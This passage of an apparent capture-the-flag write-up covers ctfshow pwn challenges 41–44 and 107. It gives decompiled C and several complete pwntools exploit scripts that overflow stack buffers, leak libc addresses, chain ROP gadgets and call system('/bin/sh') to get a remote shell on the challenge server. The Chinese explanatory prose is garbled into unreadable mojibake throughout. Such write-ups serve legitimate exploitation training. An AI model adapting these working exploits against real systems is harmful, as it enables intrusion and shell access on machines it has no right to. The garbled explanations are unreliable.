</span></span><span class="line"><span class="cl">  <span class="n">p_argc</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">argc</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">init</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="n">logo</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="n">puts</span><span class="p">(</span><span class="s2">&#34;[+] Check your permissions:&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x400</span><span class="n">u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">ctfshow</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">puts</span><span class="p">(</span><span class="s2">&#34;wtf&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">char *__cdecl ctfshow(char *s)
</span></span><span class="line"><span class="cl">{
</span></span><span class="line"><span class="cl">  char dest[8]; // [esp+7h] [ebp-11h] BYREF
</span></span><span class="line"><span class="cl">  unsigned __int8 v3; // [esp+Fh] [ebp-9h]
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  v3 = strlen(s);
</span></span><span class="line"><span class="cl">  if ( v3 &lt;= 3u || v3 &gt; 8u )
</span></span><span class="line"><span class="cl">  {
</span></span><span class="line"><span class="cl">    puts(&#34;Authentication failed!&#34;);
</span></span><span class="line"><span class="cl">    exit(-1);
</span></span><span class="line"><span class="cl">  }
</span></span><span class="line"><span class="cl">  printf(&#34;Authentication successful, Hello %s&#34;, s);
</span></span><span class="line"><span class="cl">  return strcpy(dest, s);
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><p>unsigned __int8 v3 Ë¶ÅÊ±ÇÊó†Á¨¶Âè∑8‰ΩçÊï¥Êï∞</p>
<p>strcpy(dest, s) Â∞Ü‰ºöÂ§çÂà∂8‰∏™Â≠óÁ¨¶Âä†‰∏ä‰∏Ä‰∏™Á©∫Â≠óÁ¨¶ \0ÔºåÊÄªÂÖ±9‰∏™Â≠óÁ¨¶Ôºå</p>
<p>ËøôÈáåÂ∞±ÊòØÊ£ÄÊü•Â≠óÁ¨¶‰∏≤ÈïøÂ∫¶ÔºåÊÄùËÄÉÔºöÂ¶Ç‰ΩïbypassËøô‰∏™ifÊù°‰ª∂</p>
<p>destÁöÑÊ†àÈïøÂ∫¶‰∏∫0x11,ÁºìÂÜ≤Âå∫bufÈïøÂ∫¶0x400Ôºåunsigned __int8 v3‰ªé0Âà∞255Â≠óËäÇÂ∞±Êà™Êñ≠ÔºåÂ∞±ÊòØËØ¥256Â≠óËäÇÊòØ0Ôºå257Â≠óËäÇË°®Á§∫1Ôºå258Â≠óËäÇË°®Á§∫3ÔºåÂèØ‰ª•Âà©Áî®Ëøô‰∏™Êù°‰ª∂ÊûÑÈÄ†payloadÔºå‰ΩøpayloadÈïøÂ∫¶Ë∂≥Â§üÈïø</p>
<h2 id="pwn107">pwn107
</h2><p>ÊµÅÁ®ãÔºöÂÖàÊÉ≥Â¶Ç‰ΩïÁªïËøáÊï¥Êï∞ÈôêÂà∂ÔºåÊ≥ÑÈú≤printfÂú∞ÂùÄÔºåËÆ°ÁÆólibcÂü∫ÂùÄÔºåËÆ°ÁÆósystemÂíå/bin/shÁöÑÂú∞ÂùÄÔºåË∞ÉÁî®system(&quot;/bin/sh&quot;)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">,</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28167</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/lib/i386-linux-gnu/libc.so.6&#39;</span><span class="p">)</span>  <span class="c1"># ‰ΩøÁî®Á≥ªÁªüÈªòËÆ§ÁöÑ libc Êñá‰ª∂Ë∑ØÂæÑ</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;read?&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;-1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">printf_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;printf&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">printf_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;printf&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x2c</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">printf_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">printf_got</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">printf</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">hex</span><span class="p">(</span><span class="n">printf</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">printf</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;printf&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">binsh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;read?&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;-1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x2c</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÊÄùËÄÉÔºö‰∏∫‰ªÄ‰πàÊòØprintf = u32(io.recv(4))Ôºåprint(hex(printf))</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">data = io.recv(4)  # ËøîÂõû b&#39;\x7f\x45\x4c\x46&#39;
</span></span><span class="line"><span class="cl">printf = u32(data)  # Ëß£Êûê‰∏∫Êï¥Êï∞ 0x464c457f
</span></span><span class="line"><span class="cl">print(hex(printf))  # ÊâìÂç∞ 0x464c457f
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="pwn41">pwn41
</h2><p>system(&quot;/bin/sh&quot;)ÊòØÁõ¥Êé•ÊåáÂÆö‰∫ÜÁ≥ªÁªüÈªòËÆ§ÁöÑshellÁ®ãÂ∫èË∑ØÂæÑÊù•ÊâßË°åÂëΩ‰ª§,system(&ldquo;sh&rdquo;)Âàô‰æùËµñÁ≥ªÁªüÁöÑÁéØÂ¢ÉÂèòÈáè$PATHÊù•ÂØªÊâæshÂèØÊâßË°åÊñá‰ª∂</p>
<p><img src="/p/ctfshow-pwn/image-20250308124615875.png"
	width="652"
	height="155"
	srcset="/p/ctfshow-pwn/image-20250308124615875_hu_30443bb5aa99f369.png 480w, /p/ctfshow-pwn/image-20250308124615875_hu_dcf1fd6702bef6cd.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="420"
		data-flex-basis="1009px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28166</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn(2)&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">sh</span> <span class="o">=</span> <span class="mh">0x080487BA</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x12</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="pwn42">pwn42
</h2><p>ÂíåÂâçÈù¢‰∏ÄÊ†∑Ôºå‰ªÖ‰ªÖÊòØ32‰ΩçÂíå64‰ΩçÁöÑÂå∫Âà´</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ROPgadget --binary ./pwn
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28139</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;pwn(3)&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">sh</span> <span class="o">=</span><span class="mh">0x400872</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span><span class="mh">0x400843</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="mh">0x40053e</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0xA</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="pwn43">pwn43
</h2><p>Ê≤°Êúâ‚Äòbin/sh‚ÄôÈúÄË¶ÅËá™Â∑±ÊûÑÈÄ†ÔºåÂÖàË∞ÉÁî®gets()ÂáΩÊï∞Ôºåp32(gets),Â∞ÜgetsÂáΩÊï∞ÁöÑÂú∞ÂùÄ‰Ωú‰∏∫ËøîÂõûÂú∞ÂùÄË¶ÜÁõñÂà∞Ê†à‰∏äÔºåÊòØÁ®ãÂ∫èÂú®Ê∫¢Âá∫Êó∂Ë∞ÉÁî®getsÂáΩÊï∞ÔºåÊãç2</p>
<p>‰ΩøÁî®pop_ebxÊåá‰ª§Â∞Übuf2ÁöÑÂú∞ÂùÄÂä†ËΩΩÂà∞ÂØÑÂ≠òÂô®ebx‰∏≠ÔºåÊúÄÂêéË¶ÜÁõñËøîÂõûÂú∞ÂùÄ‰∏∫systemÂáΩÊï∞ÁöÑÂú∞ÂùÄ</p>
<p><img src="/p/ctfshow-pwn/image-20250308180148608.png"
	width="964"
	height="843"
	srcset="/p/ctfshow-pwn/image-20250308180148608_hu_7ca263b8db3a42db.png 480w, /p/ctfshow-pwn/image-20250308180148608_hu_5a4fa8ca8824e128.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="114"
		data-flex-basis="274px"
	
></p>
<p>ÈÄöËøáË¶ÜÁõñËøîÂõûÂú∞ÂùÄÔºåÂ∞ÜgetsÂáΩÊï∞ÁöÑÂú∞ÂùÄ‰Ωú‰∏∫ËøîÂõûÂú∞ÂùÄË¶ÜÁõñÂà∞Ê†à‰∏äÔºå‰ΩøÁî®pop_ebxÊåá‰ª§Â∞Übuf2ÁöÑÂú∞ÂùÄÂä†ËΩΩÂà∞ÂØÑÂ≠òÂô®ebx‰∏≠ÔºåÊúÄÂêéË¶ÜÁõñËøîÂõûÂú∞ÂùÄ‰∏∫systemÂáΩÊï∞ÁöÑÂú∞ÂùÄÔºåÊâßË°åsystem(buf2)ÊåáÂêëÁöÑÂ≠óÁ¨¶‰∏≤Ôºåp32(gets)Â∞ÜgetsÂáΩÊï∞ÁöÑÂú∞ÂùÄ‰Ωú‰∏∫ËøîÂõûÂú∞ÂùÄË¶ÜÁõñÂà∞Ê†à‰∏äÔºåÊòØÁ®ãÂ∫èÂú®Ê∫¢Âá∫Êó∂Ë∞ÉÁî®getsÂáΩÊï∞Ôºåpop_ebxÁî®‰∫éÂ∞ÜÊ†à‰∏äÁöÑÂÄºÂºπÂá∫Âπ∂Â≠òÂÇ®Âà∞ÂØÑÂ≠òÂô®ebx‰∏≠Ôºåbuf2ÊòØ‰∏Ä‰∏™ÊåáÂêëÂ≠òÂÇ®ËæìÂÖ•Êï∞ÊçÆÁöÑÁºìÂÜ≤Âå∫ÁöÑÊåáÈíàÔºåp32(system)Â∞ÜsystemÂáΩÊï∞ÁöÑÂú∞ÂùÄ‰Ωú‰∏∫ËøîÂõûÂú∞ÂùÄË¶ÜÁõñÂà∞Ê†à‰∏äÔºå&lsquo;aaaa&rsquo;ËøôÈÉ®ÂàÜÊòØ‰∏Ä‰∏™4Â≠óËäÇÁöÑÂ≠óÁ¨¶‰∏≤ÔºåÁî®‰∫éÂ°´ÂÖÖÊ†à‰∏äÁöÑËøîÂõûÂú∞ÂùÄÁöÑÂâ©‰ΩôÁ©∫Èó¥„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28141</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;pwn4&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">gets</span>   <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;gets&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">system</span>  <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">buf2</span> <span class="o">=</span> <span class="mh">0x0804B060</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">pop_ebx</span> <span class="o">=</span> <span class="mh">0x08048409</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x6C</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">gets</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">pop_ebx</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">buf2</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">buf2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="pwn44">pwn44
</h2><p>Ë°•ÂÖÖ‰∏ã32‰ΩçÂíå64‰ΩçË∞ÉÁî®ËßÑÂÆö</p>
<p>32‰ΩçÔºöÂèÇÊï∞ÈÄöËøáÊ†à‰º†ÈÄíÔºåp32(system)ÂêéÈúÄË¶ÅË∑üÂèÇÊï∞Âú∞ÂùÄ</p>
<p>64‰ΩçÔºöÂâç6‰∏™ÂèÇÊï∞ÈÄöËøáÂØÑÂ≠òÂô®‰º†ÈÄíÔºåÂ¶ÇrdiÔºårsiÁ≠â</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">,</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s2">&#34;pwn.challenge.ctf.show&#34;</span><span class="p">,</span><span class="mi">28242</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">\<span class="c1">#io = process(&#34;./pwn44&#34;)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;pwn3&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;system&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">gets</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;gets&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span><span class="o">=</span><span class="mh">0x4007f3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">buf2</span><span class="o">=</span><span class="mh">0x602080</span>
</span></span><span class="line"><span class="cl">
